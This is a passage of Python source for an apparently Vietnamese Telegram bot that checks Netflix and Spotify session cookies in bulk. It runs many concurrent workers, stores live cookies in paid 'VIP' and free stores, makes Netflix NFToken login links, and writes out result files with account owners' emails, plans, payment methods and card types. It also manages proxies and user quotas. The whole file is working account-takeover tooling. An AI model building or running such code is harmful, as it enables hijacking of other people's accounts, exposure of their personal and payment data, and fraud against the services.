        return

    if awaiting == 'cookie':
        status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ *Đang phân tích cookie...*", parse_mode='Markdown')
        cookies_list = checker.extract_cookies_from_text(text)
        if not cookies_list:
            await status_msg.edit_text(f"{banner_result_fail()}\n  Không tìm thấy *NetflixId*\n  trong dữ liệu bạn gửi.\n\n  Hãy kiểm tra lại cookie.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            context.user_data['awaiting'] = None
            return
        cookie_dict = cookies_list[0]
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user_id)
        if tokens_used >= tokens_max:
            await status_msg.edit_text(f"❌ *Bạn đã hết lượt tạo link hôm nay ({tokens_max}/{tokens_max})*.\nHãy liên hệ Admin để nâng cấp gói cước hoặc quay lại vào ngày mai nhé!", parse_mode='Markdown', reply_markup=kb_done())
            context.user_data['awaiting'] = None
            return
        await status_msg.edit_text(f"⏳ *Đang kiểm tra...*\n\n  Thử kết nối tới Netflix API...\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_cancel())
        chat_id = update.effective_chat.id
        active_tasks[chat_id] = False
        success, token, error, account = checker.check_cookie(cookie_dict)
        
        if success and token and account.get('membership_status') == 'CURRENT_MEMBER': 
            add_token_usage(user_id, 1)
            update_stats(user_id, total=1, success=1)
            if active_tasks.get(chat_id, False):
                active_tasks.pop(chat_id, None)
                context.user_data['awaiting'] = None
                return
            active_tasks.pop(chat_id, None)
            
            link = checker.format_nftoken_link(token)
            await status_msg.edit_text(format_account_card(account, link), parse_mode='Markdown', disable_web_page_preview=True)
            email, plan_val, country_val = account.get('email', 'NoEmail'), account.get('plan', 'NoPlan'), account.get('country', 'XX')
            filename = f"NF_{re.sub(r'[^\w\-_]', '', email.split('@')[0])}_{re.sub(r'[^\w\-_]', '', plan_val.replace(' ', '_'))}_{re.sub(r'[^\w\-_]', '', country_val)}.txt"
            file_content = f"# ══════════════════════════════════════\n#  NETFLIX COOKIE + NFTOKEN\n#  Generated by {BOT_NAME} v{BOT_VERSION}\n#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n# ══════════════════════════════════════\n#\n# Email:      {account.get('email', 'N/A')}\n# Plan:       {account.get('plan', 'N/A')}\n# Country:    {account.get('country', 'N/A')}\n# Payment:    {account.get('payment_method', 'N/A')}\n# CC Type:    {account.get('cc_type', 'N/A')}\n# Streams:    {account.get('max_streams', 'N/A')}\n# Quality:    {account.get('video_quality', 'N/A')}\n# Status:     {account.get('membership_status', 'N/A')}\n# Extra:      {account.get('extra_member_slots', 'N/A')}\n#\n# NFToken:    {token}\n# Login:      {link}\n#\n# ══════════════════════════════════════\n\n{checker.build_netscape_format(cookie_dict)}"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO(file_content.encode()), filename=filename, caption=f"📄 {filename}")
        else: 
            update_stats(user_id, total=1, success=0)
            if error: error_str = error
            else: error_str = "Tài khoản bị Hold thanh toán hoặc Hết hạn"
            await status_msg.edit_text(f"{banner_result_fail()}\n  *Lý do:*  `{error_str}`\n\n  💡 Cookie có thể đã hết hạn\n  hoặc tài khoản bị khóa.\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown')
            
        context.user_data['awaiting'] = None
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⬇️", reply_markup=kb_done())

    if awaiting == 'add_proxy':
        if proxy_manager.set_proxy(text):
            proxy_manager.enable()
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ *Proxy đã thiết lập & bật*\n\n  🌐 `{text}`\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_proxy())
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ *Sai định dạng*\n\n  Dùng: `IP:Port` hoặc\n  `IP:Port:User:Pass`\n\n  {DIVIDER_THIN}\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_proxy())
        context.user_data['awaiting'] = None

# ══════════════════════════════════════════
#  FILE HANDLER (BATCH FOR ADMIN)
# ══════════════════════════════════════════
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    
    try: await update.message.delete()
    except: pass
    
    current_awaiting = context.user_data.get('awaiting')
    user_id = update.effective_user.id if update.effective_user else 0
    
    if current_awaiting not in ['admin_upload_cookie_vip', 'admin_upload_cookie_free', 'admin_upload_cookie_vip_fast', 'admin_upload_cookie_spotify']:
        if user_id == ADMIN_ID and update.message.document:
            fname = update.message.document.file_name or ''
            if fname.endswith('.txt') or fname.endswith('.zip'): current_awaiting = 'admin_upload_cookie_vip'
            else: return
        else: return

    file = await update.message.document.get_file()

    if file.file_size > MAX_FILE_SIZE:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ File quá lớn. Tối đa *{MAX_FILE_SIZE // 1024 // 1024}MB*", parse_mode='Markdown', reply_markup=kb_done())
        return

    file_content_buf = io.BytesIO()
    await file.download_to_memory(file_content_buf)
    file_content_buf.seek(0)
    filename = update.message.document.file_name
    all_cookies = []

    status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ *Đang đọc file...*\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_cancel())
    chat_id = update.effective_chat.id
    active_tasks[chat_id] = False

    try:
        # ====================================================
        # [0] XỬ LÝ NẠP COOKIE SPOTIFY TỪ FILE ZIP (ĐA LUỒNG + LIVE CHECK)
        # ====================================================
        if current_awaiting == 'admin_upload_cookie_spotify' and user_id == ADMIN_ID:
            if not filename.endswith('.zip'):
                await status_msg.edit_text("❌ Vui lòng gửi định dạng file `.zip`.", reply_markup=kb_admin())
                return
            
            await status_msg.edit_text("🎧 *Đang giải nén file ZIP Spotify...*", parse_mode='Markdown')
            
            extracted_accounts = []
            with zipfile.ZipFile(file_content_buf) as zip_file:
                for txt_file in [f for f in zip_file.namelist() if f.endswith('.txt')]:
                    with zip_file.open(txt_file) as f:
                        text_content = f.read().decode('utf-8', errors='ignore')
                        result = process_spotify_cookie_text(text_content)
                        if result:
                            extracted_accounts.append(result)
            
            total_len = len(extracted_accounts)
            if total_len == 0:
                await status_msg.edit_text("❌ Không tìm thấy cookie Spotify hợp lệ trong file ZIP.", reply_markup=kb_admin())
                return

            await status_msg.edit_text(f"🔍 *Đang kiểm tra LIVE {total_len} acc Spotify...*\n(Đa luồng 15 workers)", parse_mode='Markdown')
            
            live_premium = 0
            live_family = 0
            dead_count = 0
            processed_count = 0
            valid_spotify_to_insert = []
            
            queue = asyncio.Queue()
            for acc in extracted_accounts:
                queue.put_nowait(acc)

            async def spotify_worker():
                nonlocal live_premium, live_family, dead_count, processed_count
                while True:
                    try: acc = queue.get_nowait()
                    except asyncio.QueueEmpty: break
                    
                    if active_tasks.get(chat_id, False):
                        queue.task_done()
                        continue

                    try:
                        json_cookies = json.loads(acc['json_data'])
                        # LIVE CHECK QUA API SPOTIFY THỰC TẾ!
                        is_live, actual_plan = await check_spotify_cookie_live(json_cookies)
                        
                        if is_live and actual_plan:
                            valid_spotify_to_insert.append((acc['json_data'], acc['email'], acc['country'], actual_plan))
                            if actual_plan == 'PREMIUM': live_premium += 1
                            else: live_family += 1
                        else:
                            dead_count += 1
                    except Exception:
                        dead_count += 1

                    processed_count += 1
                    queue.task_done()

            # Chạy 15 luồng giống như Netflix
            workers = [asyncio.create_task(spotify_worker()) for _ in range(15)]
            last_update = time.time()
            
            while not queue.empty() or processed_count < total_len:
                await asyncio.sleep(1)
                if active_tasks.get(chat_id, False): break
                if time.time() - last_update >= 2:
                    try: 
                        await status_msg.edit_text(
                            f"🔍 *Đang Live Check Spotify...*\n\n"
                            f"  📋 Tiến độ: *{processed_count}* / *{total_len}* ({round(processed_count/total_len*100)}%)\n"
                            f"  🎵 Premium Sống: *{live_premium}*\n"
                            f"  👨‍👩‍👧‍👦 Chủ Family Sống: *{live_family}*\n"
                            f"  ❌ Lỗi / Free / Hết Hạn: *{dead_count}*", 
                            parse_mode='Markdown', reply_markup=kb_cancel()
                        )
                    except: pass
                    last_update = time.time()
                    
            try: await asyncio.wait_for(queue.join(), timeout=30)
            except asyncio.TimeoutError: pass
            for w in workers: w.cancel()
            
            # CHỈ INSERT VÀO DB ĐÚNG 1 LẦN DUY NHẤT SAU KHI CHẠY XONG
            if valid_spotify_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    c.executemany("INSERT INTO spotify_cookies (json_data, email, country, plan_type) VALUES (?, ?, ?, ?)", valid_spotify_to_insert)
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Spotify Batch Insert Error: {e}")
                    
            active_tasks.pop(chat_id, None)
            
            total_added = live_premium + live_family
            msg = (
                f"✅ *LỌC & NẠP SPOTIFY HOÀN TẤT*\n\n"
                f"📦 Tổng file gửi lên: *{total_len}*\n"
                f"✅ Cookie sống (Đã nạp kho): *{total_added}*\n"
                f"   ├ 🎵 Premium Thường: *{live_premium}*\n"
                f"   └ 👨‍👩‍👧‍👦 Chủ Family: *{live_family}*\n"
                f"❌ Lỗi / Bị giáng xuống Free: *{dead_count}*"
            )
            await status_msg.edit_text(msg, parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            return

        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_content_buf) as zip_file:
                for txt_file in [f for f in zip_file.namelist() if f.endswith('.txt')]:
                    if active_tasks.get(chat_id, False):
                        await status_msg.edit_text(f"⏹ *Đã dừng*\n\n  {FOOTER}", parse_mode='Markdown')
                        active_tasks.pop(chat_id, None)
                        return
                    with zip_file.open(txt_file) as f:
                        all_cookies.extend(checker.extract_cookies_from_text(f.read().decode('utf-8', errors='ignore')))
        elif filename.endswith('.txt'): all_cookies = checker.extract_cookies_from_text(file_content_buf.read().decode('utf-8', errors='ignore'))
        else:
            await status_msg.edit_text(f"❌ Chỉ hỗ trợ `.txt` và `.zip`\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            return

        if not all_cookies:
            await status_msg.edit_text(f"❌ Không tìm thấy cookie hợp lệ.\n  Cần có *NetflixId* trong file.\n\n  {FOOTER}", parse_mode='Markdown', reply_markup=kb_done())
            return

        # ====================================================
        # [1] NẠP NHANH NETFLIX (KHÔNG CHECK)
        # ====================================================
        if current_awaiting == 'admin_upload_cookie_vip_fast' and user_id == ADMIN_ID:
            total_len = len(all_cookies)
            await status_msg.edit_text(f"⚡ *Đang nạp thẳng {total_len} cookie (Không qua bước check)...*", parse_mode='Markdown')
            
            fast_data_to_insert = [(checker.build_netscape_format(cookie_dict),) for cookie_dict in all_cookies]
            if fast_data_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    c.executemany("INSERT INTO premium_cookies (data) VALUES (?)", fast_data_to_insert)
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Fast Insert Error: {e}")
            
            await status_msg.edit_text(f"✅ *NẠP NHANH THÀNH CÔNG*\n\n📦 Đã nạp *{total_len}* cookie trực tiếp vào kho VIP!", parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            active_tasks.pop(chat_id, None)
            return

        # ====================================================
        # [2] CHECK & NẠP NETFLIX (ĐA LUỒNG)
        # ====================================================
        if current_awaiting in ['admin_upload_cookie_vip', 'admin_upload_cookie_free'] and user_id == ADMIN_ID:
            is_vip = (current_awaiting == 'admin_upload_cookie_vip')
            target_name = "VIP" if is_vip else "Free"
            total_len = len(all_cookies)
            
            await status_msg.edit_text(f"🔍 *Đang khởi tạo máy quét đa luồng...*\nTổng số: {total_len} cookie", parse_mode='Markdown')
            
            live_count = 0
            dead_count = 0
            processed_count = 0
            valid_cookies_to_insert = []
            
            queue = asyncio.Queue()
            for cookie_dict in all_cookies: 
                queue.put_nowait(cookie_dict)
                
            async def admin_worker():
                nonlocal live_count, dead_count, processed_count
                while True:
                    try: cookie_dict = queue.get_nowait()
                    except asyncio.QueueEmpty: break
                    
                    if active_tasks.get(chat_id, False):
                        queue.task_done()
                        continue
                        
                    try: 
                        success, token, error, account = await asyncio.wait_for(asyncio.to_thread(checker.check_cookie, cookie_dict), timeout=12)
                        if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                            valid_cookies_to_insert.append(checker.build_netscape_format(cookie_dict))
                            live_count += 1
                        else: 
                            dead_count += 1
                    except Exception: 
                        dead_count += 1
                        
                    processed_count += 1
                    queue.task_done()

            workers = [asyncio.create_task(admin_worker()) for _ in range(15)]
            last_update = time.time()
            
            while not queue.empty() or processed_count < total_len:
                await asyncio.sleep(1)
                if active_tasks.get(chat_id, False): break
                if time.time() - last_update >= 2:
                    try: 
                        await status_msg.edit_text(
                            f"🔍 *Đang Lọc Cookie Siêu Tốc...*\n\n"
                            f"  📋 Tiến độ: *{processed_count}* / *{total_len}* ({round(processed_count/total_len*100)}%)\n"
                            f"  ✅ Cookie Chuẩn (Đang chờ nạp): *{live_count}*\n"
                            f"  ❌ Hết Hạn / Lỗi: *{dead_count}*", 
                            parse_mode='Markdown', reply_markup=kb_cancel()
                        )
                    except: pass
                    last_update = time.time()
                    
            try: await asyncio.wait_for(queue.join(), timeout=30)
            except asyncio.TimeoutError: pass
            for w in workers: w.cancel()
            
            if valid_cookies_to_insert:
                try:
                    conn = get_connection()
                    c = conn.cursor()
                    if is_vip:
                        c.executemany("INSERT INTO premium_cookies (data) VALUES (?)", [(ck,) for ck in valid_cookies_to_insert])
                    else:
                        c.executemany("INSERT INTO free_cookies (data) VALUES (?)", [(ck,) for ck in valid_cookies_to_insert])
                    conn.commit()
                    conn.close()
                except Exception as e:
                    logger.error(f"Batch Insert Error: {e}")
            
            active_tasks.pop(chat_id, None)
            
            await status_msg.edit_text(f"✅ *LỌC & NẠP HOÀN TẤT*\n\n📦 Tổng quét: *{total_len}*\n✅ Cookie sống chuẩn (Đã nạp kho {target_name}): *{live_count}*\n❌ Bỏ qua (Die/Hết hạn): *{dead_count}*", parse_mode='Markdown', reply_markup=kb_admin())
            context.user_data['awaiting'] = None
            return

        # ====================================================
        # [3] USER BÌNH THƯỜNG QUÉT FILE
        # ====================================================
        tokens_used, tokens_max, _, _, _ = get_user_quota(user_id)
        remaining = tokens_max - tokens_used
        if len(all_cookies) > remaining and user_id != ADMIN_ID:
            await status_msg.edit_text(f"❌ File chứa *{len(all_cookies)}* cookie, nhưng bạn chỉ còn lại *{remaining}* lượt tạo link hôm nay.\n\nVui lòng nâng cấp gói hoặc giảm bớt số lượng cookie trong file.", parse_mode='Markdown', reply_markup=kb_done())
            return

        await status_msg.edit_text(progress_bar(0, len(all_cookies), 0), parse_mode='Markdown', reply_markup=kb_cancel())

        results, success_count, processed_count, total_len = [], 0, 0, len(all_cookies)
        queue = asyncio.Queue()
        for i, cookie_dict in enumerate(all_cookies, 1): queue.put_nowait((i, cookie_dict))
            
        async def user_worker():
            nonlocal success_count, processed_count
            while True:
                try: item = queue.get_nowait()
                except asyncio.QueueEmpty: break
                i, cookie_dict = item
                if active_tasks.get(chat_id, False) or get_user_quota(user_id)[0] >= get_user_quota(user_id)[1]:
                    queue.task_done()
                    continue
                try: success, token, error, account = await asyncio.to_thread(NetflixTokenChecker().check_cookie, cookie_dict)
                except Exception as e: success, token, error, account = False, None, str(e), {}
                
                if success and token and account.get('membership_status') == 'CURRENT_MEMBER':
                    results.append({'cookies': cookie_dict, 'token': token, 'link': checker.format_nftoken_link(token), 'account': account})
                    success_count += 1
                processed_count += 1
                queue.task_done()

        workers = [asyncio.create_task(user_worker()) for _ in range(15)]
        start_time, last_update, stall_count, last_processed = time.time(), time.time(), 0, 0
        
        while not queue.empty() or processed_count < total_len:
            await asyncio.sleep(1)
            if time.time() - start_time > 300: break
            if processed_count == last_processed: stall_count += 1
            else: stall_count, last_processed = 0, processed_count
            if stall_count >= 30 or active_tasks.get(chat_id, False): break
            if time.time() - last_update >= 3:
                try: await status_msg.edit_text(progress_bar(processed_count, total_len, success_count), parse_mode='Markdown', reply_markup=kb_cancel())
                except Exception: pass
                last_update = time.time()
        
        try: await asyncio.wait_for(queue.join(), timeout=30)
        except asyncio.TimeoutError: pass
        for w in workers: w.cancel()
        
        if success_count > 0:
            add_token_usage(user_id, success_count)
            
        active_tasks.pop(chat_id, None)
        update_stats(user_id, total=processed_count, success=success_count)

        out_of_quota = get_user_quota(user_id)[0] >= get_user_quota(user_id)[1]
        banner_text = banner_batch_done(success_count, total_len)
        if out_of_quota: banner_text += f"\n\n⚠️ *Đã dừng do hết lượt tạo link ({get_user_quota(user_id)[1]}/{get_user_quota(user_id)[1]})*"
        await status_msg.edit_text(banner_text, parse_mode='Markdown')

        if results:
            content_lines = [f"════════════════════════════════════════\n BÁO CÁO KẾT QUẢ TẠO NFTOKEN\n Cung cấp bởi {BOT_NAME} v{BOT_VERSION}\n Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n Tổng quét: {processed_count} | Thành công: {success_count}\n════════════════════════════════════════\n"]
            for i, res in enumerate(results, 1):
                acc = res['account']
                content_lines.extend([f"[{i}] TÀI KHOẢN", f"Email: {acc.get('email', 'N/A')}", f"Gói cước: {acc.get('plan', 'N/A')} - {acc.get('country', 'N/A')}", f"Thanh toán: {acc.get('payment_method', 'N/A')} - {acc.get('cc_type', 'N/A')}", f"NFToken: {res['token']}", f"Login Link: {res['link']}", f"\nNetscape Cookie:\n{checker.build_netscape_format(res['cookies'])}", f"\n{'='*40}\n"])
            fname = f"Results_{success_count}_NFToken_{datetime.now().strftime('%H%M%S')}.txt"
            await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO("\n".join(content_lines).encode('utf-8')), filename=fname, caption=f"🎉 Đã quét xong! Có {success_count} account hoạt động.\nFile tổng hợp đính kèm bên dưới 👇")
        else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Không có cookie nào hoạt động.\n\n  {FOOTER}", parse_mode='Markdown')
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⬇️", reply_markup=kb_done())

    except Exception as e:
        logger.error(f"Batch error: {e}")
        await status_msg.edit_text(f"❌ *Lỗi xử lý file*\n\n  `{str(e)[:80]}`\n\n  {FOOTER}", parse_mode='Markdown')
        active_tasks.pop(chat_id, None)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

# ══════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("me", cmd_me))
    application.add_handler(CommandHandler("giftcode", cmd_giftcode))
    application.add_handler(CommandHandler("freecookie", cmd_freecookie))
    application.add_handler(CommandHandler("baoloi", cmd_baoloi))
    
    application.add_handler(CommandHandler("admin", cmd_admin))
    application.add_handler(CommandHandler("setplan", cmd_setplan))
    application.add_handler(CommandHandler("addplan", cmd_addplan))
    application.add_handler(CommandHandler("addcookie", cmd_addcookie))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))

    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler((filters.TEXT | filters.PHOTO) & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_error_handler(error_handler)

    import sys
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    print(f"[{BOT_NAME}] Bot running on v{BOT_VERSION}...")
    application.run_polling()

if __name__ == '__main__':
    main()
